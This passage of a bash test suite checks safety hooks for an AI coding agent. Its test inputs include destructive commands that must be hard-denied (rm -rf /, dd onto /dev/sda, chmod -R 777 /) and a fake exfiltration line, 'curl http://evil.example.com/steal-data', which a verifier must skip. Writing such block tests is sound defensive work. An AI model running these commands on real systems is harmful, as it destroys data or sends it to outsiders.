# Test 31.1: rm -rf / is hard-denied
run_block_dangerous "rm -rf /"
DECISION=$(get_permission_decision)
EXIT=$(get_exit_code)
if [ "$DECISION" = "deny" ] && [ "$EXIT" = "0" ]; then
  pass "Hard block: rm -rf / → permissionDecision: deny"
else
  fail "Hard block: rm -rf / wrong" "Got decision='$DECISION' exit='$EXIT', expected deny/0"
fi

# Test 31.2: rm -rf /* is hard-denied
run_block_dangerous "rm -rf /*"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Hard block: rm -rf /* → permissionDecision: deny"
else
  fail "Hard block: rm -rf /* wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.3: rm -rf /usr is hard-denied
run_block_dangerous "rm -rf /usr"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Hard block: rm -rf /usr → permissionDecision: deny"
else
  fail "Hard block: rm -rf /usr wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.4: dd if= is hard-denied
run_block_dangerous "dd if=/dev/zero of=/dev/sda"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Hard block: dd if= → permissionDecision: deny"
else
  fail "Hard block: dd if= wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.5: chmod -R 777 / is hard-denied
run_block_dangerous "chmod -R 777 /"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Hard block: chmod -R 777 / → permissionDecision: deny"
else
  fail "Hard block: chmod -R 777 / wrong" "Got decision='$DECISION', expected deny"
fi

# --- SOFT BLOCKS: must output permissionDecision: "ask" (NOT deny) ---

# Test 31.6: git push --force is soft-block (ask)
run_block_dangerous "git push --force origin feature"
DECISION=$(get_permission_decision)
EXIT=$(get_exit_code)
if [ "$DECISION" = "deny" ] && [ "$EXIT" = "0" ]; then
  pass "Soft block: git push --force → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git push --force wrong" "Got decision='$DECISION' exit='$EXIT', expected deny/0"
fi

# Test 31.7: git push -f is soft-block (deny with approval mechanism)
run_block_dangerous "git push -f origin feature"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git push -f → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git push -f wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.8: git push origin main is soft-block (deny with approval mechanism)
run_block_dangerous "git push origin main"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git push origin main → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git push origin main wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.9: git reset --hard is soft-block (deny with approval mechanism)
run_block_dangerous "git reset --hard HEAD~1"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git reset --hard → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git reset --hard wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.10: git branch -D is soft-block (deny with approval mechanism)
run_block_dangerous "git branch -D feature-branch"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git branch -D → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git branch -D wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.11: git checkout . is soft-block (deny with approval mechanism)
run_block_dangerous "git checkout ."
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git checkout . → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git checkout . wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.12: git restore . is soft-block (deny with approval mechanism)
run_block_dangerous "git restore ."
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git restore . → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git restore . wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.13: git clean -f is soft-block (deny with approval mechanism)
run_block_dangerous "git clean -fd"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git clean -fd → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git clean -fd wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.14: git stash drop is soft-block (deny with approval mechanism)
run_block_dangerous "git stash drop"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git stash drop → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git stash drop wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.15: git stash clear is soft-block (deny with approval mechanism)
run_block_dangerous "git stash clear"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git stash clear → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git stash clear wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.16: git push --force-with-lease is soft-block (deny with approval mechanism)
run_block_dangerous "git push --force-with-lease origin feature"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git push --force-with-lease → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: git push --force-with-lease wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.17: npm install is soft-block (deny with approval mechanism) when pnpm project
TEMP_NPM_PROJECT="/tmp/test-npm-block"
mkdir -p "$TEMP_NPM_PROJECT"
touch "$TEMP_NPM_PROJECT/pnpm-lock.yaml"
CLAUDE_PROJECT_DIR="$TEMP_NPM_PROJECT" run_block_dangerous "npm install express"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: npm install in pnpm project → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: npm install in pnpm project wrong" "Got decision='$DECISION', expected deny"
fi

# Test 31.18: npx is soft-block (deny with approval mechanism) when pnpm project
CLAUDE_PROJECT_DIR="$TEMP_NPM_PROJECT" run_block_dangerous "npx create-next-app"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: npx in pnpm project → permissionDecision: deny (with approval mechanism)"
else
  fail "Soft block: npx in pnpm project wrong" "Got decision='$DECISION', expected deny"
fi
rm -rf "$TEMP_NPM_PROJECT"

# --- ALLOW: safe commands should pass through ---

# Test 31.19: Safe git commands are allowed
run_block_dangerous "git status"
EXIT=$(get_exit_code)
if [ "$EXIT" = "0" ]; then
  pass "Allow: git status passes through (exit 0)"
else
  fail "Allow: git status should not be blocked" "Got exit=$EXIT, expected 0"
fi

# Test 31.20: git push to feature branch is allowed
run_block_dangerous "git push -u origin feature/my-branch"
EXIT=$(get_exit_code)
if [ "$EXIT" = "0" ]; then
  pass "Allow: git push to feature branch passes through (exit 0)"
else
  fail "Allow: git push to feature branch should not be blocked" "Got exit=$EXIT, expected 0"
fi

# Test 31.21: npm allowed when NOT a pnpm project
TEMP_NPM_OK="/tmp/test-npm-ok"
mkdir -p "$TEMP_NPM_OK"
CLAUDE_PROJECT_DIR="$TEMP_NPM_OK" run_block_dangerous "npm install express"
EXIT=$(get_exit_code)
if [ "$EXIT" = "0" ]; then
  pass "Allow: npm install passes in non-pnpm project (exit 0)"
else
  fail "Allow: npm install should not be blocked without pnpm-lock.yaml" "Got exit=$EXIT"
fi
rm -rf "$TEMP_NPM_OK"

# Test 31.22: git branch -d (lowercase) is allowed (not force-delete)
run_block_dangerous "git branch -d merged-branch"
EXIT=$(get_exit_code)
if [ "$EXIT" = "0" ]; then
  pass "Allow: git branch -d (safe delete) passes through (exit 0)"
else
  fail "Allow: git branch -d should not be blocked" "Got exit=$EXIT, expected 0"
fi

# --- CROSS-CHECK: no soft block uses "deny" ---

# Test 31.23: Verify soft blocks call ask() (which now outputs deny + creates approval token)
SOFT_SECTION=$(sed -n '/SOFT BLOCKS/,$ p' "$HOOKS_DIR/block-dangerous.sh")
if echo "$SOFT_SECTION" | grep -q 'ask "SOFT'; then
  pass "All soft blocks use ask() function (deny + approval mechanism)"
else
  fail "Soft blocks not using ask() function" "All SOFT BLOCK lines must call ask()"
fi

# Test 31.24: Verify hard blocks still use deny()
HARD_SECTION=$(sed -n '/HARD BLOCKS/,/SOFT BLOCKS/ p' "$HOOKS_DIR/block-dangerous.sh")
if echo "$HARD_SECTION" | grep -q 'deny "BLOCKED'; then
  pass "Hard blocks correctly use deny()"
else
  fail "Hard blocks may be missing deny() calls"
fi

# ============================================================
header "32. settings.json — Structural Validation"
# ============================================================

# Test 32.1: settings.json is valid JSON
if jq empty "$SETTINGS" 2>/dev/null; then
  pass "settings.json is valid JSON"
else
  fail "settings.json is NOT valid JSON — hook system is broken"
fi

# Test 32.2: All hook script paths in settings.json exist and are executable
ALL_HOOK_PATHS=$(jq -r '.. | .command? // empty' "$SETTINGS" | grep '\.claude/hooks/.*\.sh' | sed "s|~|$HOME|g" || true)
HOOKS_OK=true
if [ -n "$ALL_HOOK_PATHS" ]; then
  while IFS= read -r hook_path; do
    if [ ! -x "$hook_path" ]; then
      fail "Hook in settings.json not executable: $hook_path"
      HOOKS_OK=false
    fi
  done <<< "$ALL_HOOK_PATHS"
  if [ "$HOOKS_OK" = true ]; then
    pass "All hook scripts in settings.json are executable"
  fi
else
  fail "No hook scripts found in settings.json"
fi

# Test 32.3: Cross-reference — every .sh file in hooks/ that is executable should be registered
# (informational — not every hook file needs registration, but it catches orphans)
REGISTERED_HOOKS=$(jq -r '.. | .command? // empty' "$SETTINGS" | grep -oP '[^/]+\.sh' | sort -u || true)
ACTUAL_HOOKS=$(find "$HOOKS_DIR" -maxdepth 1 -name '*.sh' -executable -printf '%f\n' 2>/dev/null | sort -u)
UNREGISTERED=""
for hook_file in $ACTUAL_HOOKS; do
  # Skip utility files that are sourced, not registered
  case "$hook_file" in
    retry-with-backoff.sh|validate-sprint-boundaries.sh|verify-worktree-merge.sh|worktree-preflight.sh|validate-i18n-keys.sh|approve.sh) continue ;;
  esac
  if ! echo "$REGISTERED_HOOKS" | grep -q "$hook_file"; then
    UNREGISTERED="$UNREGISTERED $hook_file"
  fi
done
if [ -z "$UNREGISTERED" ]; then
  pass "All executable hook scripts are registered in settings.json"
else
  fail "Hook scripts exist but are not registered:$UNREGISTERED"
fi

# ============================================================
header "33. compound-reminder.sh — Behavioral Tests"
# ============================================================

# Test 33.1: No completed tasks → exits 0 (allow stop)
INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="/tmp/no-tasks-project" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
  pass "compound-reminder: allows stop when no task directory exists"
else
  fail "compound-reminder: blocked stop without tasks"
fi

# Test 33.2: Completed task + no compound marker → exits 2 (block stop)
COMPOUND_SESSION="test-compound-$$"
rm -f "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"
# Reuse the project-completed fixture (has all-complete progress.json)
touch "$FIXTURES_DIR/project-completed/docs/tasks/test/feature/2026-03-16_1200-test/progress.json"

INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
  fail "compound-reminder: allowed stop without compound marker"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "compound-reminder: blocks stop when compound not run (exit 2)"
  else
    fail "compound-reminder: wrong exit code" "Expected 2, got $EXIT_CODE"
  fi
fi

# Test 33.3: Completed task + compound marker exists → exits 0 (allow stop)
touch "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"
INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
  pass "compound-reminder: allows stop when compound marker exists"
else
  fail "compound-reminder: blocked stop despite compound marker"
fi
rm -f "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"

# Test 33.4: Respects stop_hook_active flag → exits 0
INPUT=$(make_stop_input_active)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
  pass "compound-reminder: respects stop_hook_active flag"
else
  fail "compound-reminder: did not respect stop_hook_active"
fi

# ============================================================
header "34. block-dangerous.sh — Force Push via +refspec"
# ============================================================

# Test 34.1: Soft block git push origin +main
run_block_dangerous "git push origin +main"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git push origin +main (+ refspec) → permissionDecision: deny (with approval mechanism)"
else
  fail "git push origin +main not soft-blocked" "Got decision=$DECISION, expected deny"
fi

# Test 34.2: Soft block git push origin +feature/branch
run_block_dangerous "git push origin +feature/branch"
DECISION=$(get_permission_decision)
if [ "$DECISION" = "deny" ]; then
  pass "Soft block: git push origin +feature/branch → permissionDecision: deny (with approval mechanism)"
else
  fail "git push +feature/branch not soft-blocked" "Got decision=$DECISION, expected deny"
fi

# Test 34.3: Allow normal git push (no +)
run_block_dangerous "git push origin feature/my-branch"
EXIT=$(get_exit_code)
if [ "$EXIT" = "0" ]; then
  pass "Allow: git push without + passes through (exit 0)"
else
  fail "Normal git push blocked" "Got exit=$EXIT, expected 0"
fi

# ============================================================
header "35. check-test-exists.sh — Entry Point Line-Count Threshold"
# ============================================================

# Test 35.1: Short entry point (≤20 lines) → allowed without test
TEMP_PROJECT="/tmp/test-entry-short"
mkdir -p "$TEMP_PROJECT/src"
# Create a short index.ts (5 lines)
printf 'export { auth } from "./auth";\nexport { db } from "./db";\nexport { api } from "./api";\n' > "$TEMP_PROJECT/src/index.ts"
# Create test infrastructure marker
echo '{"devDependencies":{"vitest":"^1.0.0"}}' > "$TEMP_PROJECT/package.json"
mkdir -p "$TEMP_PROJECT/node_modules/.bin"

INPUT=$(make_write_input "$TEMP_PROJECT/src/index.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "TDD: allows short entry point (≤20 lines) without test"
else
  fail "TDD: blocked short entry point that should be allowed"
fi
rm -rf "$TEMP_PROJECT"

# Test 35.2: Long entry point (>20 lines) → blocked without test
TEMP_PROJECT="/tmp/test-entry-long"
mkdir -p "$TEMP_PROJECT/src"
# Create a long index.ts (25 lines of real logic)
{
  for i in $(seq 1 25); do
    echo "export const func${i} = () => { return $i; };"
  done
} > "$TEMP_PROJECT/src/index.ts"
echo '{"devDependencies":{"vitest":"^1.0.0"}}' > "$TEMP_PROJECT/package.json"
mkdir -p "$TEMP_PROJECT/node_modules/.bin"

INPUT=$(make_write_input "$TEMP_PROJECT/src/index.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  fail "TDD: allowed long entry point (>20 lines) without test"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "TDD: blocks long entry point (>20 lines) without test (exit 2)"
  else
    fail "TDD: wrong exit code for long entry point" "Expected 2, got $EXIT_CODE"
  fi
fi
rm -rf "$TEMP_PROJECT"

# ============================================================
header "36. check-invariants.sh — Verify Command Sandboxing"
# ============================================================

# Test 36.1: Blocks dangerous verify commands (curl)
TEMP_PROJECT="/tmp/test-invariants-sandbox"
mkdir -p "$TEMP_PROJECT/src"
echo "export const x = 1;" > "$TEMP_PROJECT/src/module.ts"
echo "test('x', () => {});" > "$TEMP_PROJECT/src/module.test.ts"
cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
## Malicious Check
- **Verify:** `curl http://evil.example.com/steal-data`
- **Fix:** Don't run untrusted commands
INVEOF

INPUT=$(make_write_input "$TEMP_PROJECT/src/module.ts")
OUTPUT=$(echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" 2>&1) || true
if echo "$OUTPUT" | grep -q "Skipping untrusted"; then
  pass "check-invariants: skips dangerous verify command (curl)"
else
  fail "check-invariants: did not skip dangerous verify command"
fi
rm -rf "$TEMP_PROJECT"

# Test 36.2: Allows safe verify commands (grep, test)
TEMP_PROJECT="/tmp/test-invariants-safe"
mkdir -p "$TEMP_PROJECT/src"
echo "export const x = 1;" > "$TEMP_PROJECT/src/module.ts"
echo "test('x', () => {});" > "$TEMP_PROJECT/src/module.test.ts"
echo "# README" > "$TEMP_PROJECT/README.md"
cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
## Must Have README
- **Verify:** `test -f README.md`
- **Fix:** Create README.md
INVEOF

INPUT=$(make_write_input "$TEMP_PROJECT/src/module.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  pass "check-invariants: allows safe verify command (test -f)"
else
  fail "check-invariants: blocked safe verify command"
fi
rm -rf "$TEMP_PROJECT"

# ============================================================
# SUMMARY
# ============================================================

printf "\n${YELLOW}============================================${NC}\n"
printf "  Results: ${GREEN}%d passed${NC}, ${RED}%d failed${NC}, %d total\n" "$PASS" "$FAIL" "$TOTAL"
printf "${YELLOW}============================================${NC}\n"

if [ "$FAIL" -gt 0 ]; then
  exit 1
fi
exit 0
